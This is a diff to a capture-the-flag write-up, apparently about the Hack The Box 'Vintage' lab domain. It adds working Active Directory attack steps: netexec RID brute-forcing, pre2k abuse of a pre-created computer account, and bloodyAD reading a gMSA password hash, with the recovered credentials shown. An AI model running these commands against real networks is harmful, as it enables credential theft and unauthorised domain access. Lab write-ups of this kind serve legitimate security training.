@@ -342,13 +342,66 @@ Shortest Paths to Uncontrainted Delegation Systems:
 
 ![image](https://github.com/user-attachments/assets/a164019e-1f0c-4b6a-b053-57a82a38bfd4)
 
-## 3. Investigating `FS01.vintage.htb`
+## 3. Lateral movement
 
-`FS01.vintage.htb` is mentioned in the BloodHound query, it seems to be a domain computer, but not recorded in the domain DNS
+### 3.1. Moving to `FS01.vintage.htb`
 
-`FS01` is a member of `PRE-WINDOWS 2000 COMPATIBLE ACCESS` group - this can be useful
+`FS01.vintage.htb` is mentioned in the BloodHound query, which seems to be a domain computer, but not recorded in the domain DNS
+
+A quick check in BloodHound shows that `FS01` is a member of `PRE-WINDOWS 2000 COMPATIBLE ACCESS` group, which is a _vintage_ method of having [pre-created computer accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)
 
 ![image](https://github.com/user-attachments/assets/96d0342b-f145-453b-9ef8-ec7fb864af39)
+
+Searching for pre2k quickly leads to a useful [python script](https://github.com/garrettfoster13/pre2k-TS)
+
+Prepare the user name list:
+
+```console
+root@kali:~# netexec smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.lst
+Administrator
+Guest
+krbtgt
+DC01$
+gMSA01$
+FS01$
+M.Rossi
+R.Verdi
+L.Bianchi
+G.Viola
+C.Neri
+P.Rosa
+svc_sql
+svc_ldap
+svc_ark
+C.Neri_adm
+L.Bianchi_adm
+python3 pre2k.py unauth -d vintage.htb -dc-ip dc01.vintage.htb -save -inputfile users.lst
+```
+
+Running pre2k checks each account in the list for pre 2000 membership, and the `-save` option conveniently gets and saves TGT for the account
+
+```console
+root@kali:~# python3 pre2k.py unauth -d vintage.htb -dc-ip dc01.vintage.htb -save -inputfile users.lst
+/root/pre2k.py:23: SyntaxWarning: invalid escape sequence '\ '
+  show_banner = '''
+
+                                ___    __                __
+                              /'___`\ /\ \              /\ \__
+ _____   _ __    __          /\_\ /\ \\ \ \/'\          \ \ ,_\   ____
+/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <    _______\ \ \/  /',__\
+\ \ \L\ \ \ \//\  __//\______\  // /_\ \\ \ \\`\ /\______\\ \ \_/\__, `\
+ \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\/______/ \ \__\/\____/
+  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/          \/__/\/___/
+   \ \_\
+    \/_/                                        @garrfoster
+
+Reading from users.lst...
+Testing started at 2025-01-01 12:36:38.630825
+Saving ticket in FS01$.ccache
+[+] VALID CREDENTIALS: vintage.htb\FS01$:fs01
+```
+
+### 3.2. Moving to `GMSA01$`
 
 Checking the `Group Delegated Object Control` under `Node Info` for `FS01`:
 - `FS01` is a member of `Domain Computers` group
@@ -359,6 +412,31 @@ Checking the `Group Delegated Object Control` under `Node Info` for `FS01`:
 GMSA was supposedly a way to secure service account passwords, it may ironically be the way in for this case
 
 ![image](https://github.com/user-attachments/assets/98841e3f-b19b-4209-b01b-8468efbe7ba5)
+
+Let's use the `ReadGMSAPassword` permission to get the password hash for `GMSA01$`
+
+> [!Tip]
+>
+> bloodyAD is used to perform specific LDAP calls to a domain controller for AD privesc
+> 
+> It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc
+>
+> Install bloodyAD in Kali with `apt -y install bloodyAD`
+
+```console
+root@kali:~# export KRB5CCNAME='FS01$.ccache'
+
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d 'vintage.htb' -k --dc-ip 10.10.11.45 get object 'GMSA01$' --attr msDS-ManagedPassword
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:FS01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+
+distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
+msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==
+```
+
+### 3.3. Moving to `ServiceManagers`
 
 Checking the `First Degree Object Control` under `Node Info` for `GMSA01$`:
 - `GMSA01$` has `AddSelf` and `GenericWrite` rights to `ServiceManagers`
